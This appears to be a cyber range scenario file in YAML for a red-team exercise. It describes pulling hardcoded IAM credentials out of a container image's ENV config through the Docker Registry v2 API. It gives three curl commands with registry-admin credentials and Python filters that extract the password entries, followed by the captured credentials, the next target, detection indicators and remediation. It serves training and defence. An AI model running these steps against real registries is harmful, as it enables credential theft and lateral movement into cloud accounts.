id: red_04_cld-registry_image_env_creds
name: "Hardcoded Credentials in Container Image ENV — IAM Credential Extraction"
range: RNG-CLD-01
machine: M4-cld-registry
mitre:
  - technique: T1552.001
    name: "Unsecured Credentials: Credentials In Files"
cwe:
  - CWE-798  # Use of Hard-coded Credentials
cvss: "9.1 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)"
description: |
  The pul-cloud/platform-svc:latest container image has hardcoded IAM service
  account credentials (CLOUD_IAM_USER, CLOUD_IAM_PASS) in its image configuration
  ENV array. The Registry v2 API allows fetching the config blob directly using
  only registry authentication, exposing these credentials without running the image.
entry_condition: "registry-admin:Reg!stry@CLD2024 @ 11.0.2.40:5000 (from M3 K8s secret)"
prereqs:
  - Registry credentials
  - Network access to 11.0.2.40:5000
steps:
  - id: 1
    name: "Authenticate and list repos"
    cmd: "curl -s -u 'registry-admin:Reg!stry@CLD2024' http://11.0.2.40:5000/v2/_catalog"
  - id: 2
    name: "Fetch manifest, get config digest"
    cmd: "curl -s -u 'registry-admin:Reg!stry@CLD2024' -H 'Accept: application/vnd.docker.distribution.manifest.v2+json' http://11.0.2.40:5000/v2/pul-cloud/platform-svc/manifests/latest | python3 -c \"import sys,json; print(json.load(sys.stdin)['config']['digest'])\""
  - id: 3
    name: "Pull config blob and extract ENV credentials"
    cmd: "curl -s -u 'registry-admin:Reg!stry@CLD2024' http://11.0.2.40:5000/v2/pul-cloud/platform-svc/blobs/${DIGEST} | python3 -c \"import sys,json; [print(e) for e in json.load(sys.stdin)['config']['Env'] if 'IAM' in e or 'PASS' in e]\""
output:
  credential: "cloud-iam-svc:IAm@CLD!2025 @ http://11.0.2.50:8080"
  next_target: "M5 IAM Console (11.0.2.50:8080)"
artifacts:
  - "journalctl -u pul-registry"
  - "Image config blob (sha256 digest from manifest)"
detection_indicators:
  - "Config blob (small ~4KB) fetched by external IP"
  - "Sequence: _catalog → tags/list → manifests → blobs within 30s"
remediation:
  - "Remove all ENV credential directives from Dockerfile"
  - "Use K8s Secret envFrom injection at runtime"
  - "Add Trivy/Grype secret scan as CI/CD gate blocking image push on credential detection"
  - "Implement per-service registry tokens (push vs pull separation)"
